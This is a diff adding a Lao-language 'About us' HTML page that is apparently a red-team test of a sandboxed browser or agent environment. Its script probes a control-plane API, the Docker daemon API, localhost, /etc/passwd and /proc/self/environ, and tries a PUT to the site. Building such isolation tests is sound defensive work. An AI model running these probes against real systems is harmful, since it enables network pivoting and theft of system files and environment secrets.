@@ -1,0 +1,12 @@
+<!doctype html><html lang="lo"><meta charset="utf-8"><title>ກ່ຽວກັບ</title><script src="rt.js"></script>
+<h1>ກ່ຽວກັບພວກເຮົາ</h1><p>Attack: pivot to the control plane and the private network, and read local files.</p>
+<script>
+rtDone([
+  rt('fetch control plane http://control:8000/api/health', () => fetch('http://control:8000/api/health').then(viaProxy)),
+  rt('fetch Docker API http://172.17.0.1:2375/containers/json', () => fetch('http://172.17.0.1:2375/containers/json').then(viaProxy)),
+  rt('fetch http://localhost:8000/', () => fetch('http://localhost:8000/').then(viaProxy)),
+  rt('fetch file:///etc/passwd', () => fetch('file:///etc/passwd').then((r) => r.text())),
+  rt('iframe file:///proc/self/environ', () => new Promise((ok, bad) => { const f = document.createElement('iframe'); f.src = 'file:///proc/self/environ'; f.onload = () => { try { ok(f.contentDocument.body.innerText.slice(0, 40) || 'empty'); } catch (e) { bad(new Error('unreadable (cross-origin)')); } }; document.body.appendChild(f); setTimeout(() => bad(new Error('not loaded')), 3000); })),
+  rt('PUT to the target site itself (/demo/x)', () => fetch('/demo/x', { method: 'PUT', body: 'x' }).then(viaProxy)),
+]);
+</script></html>
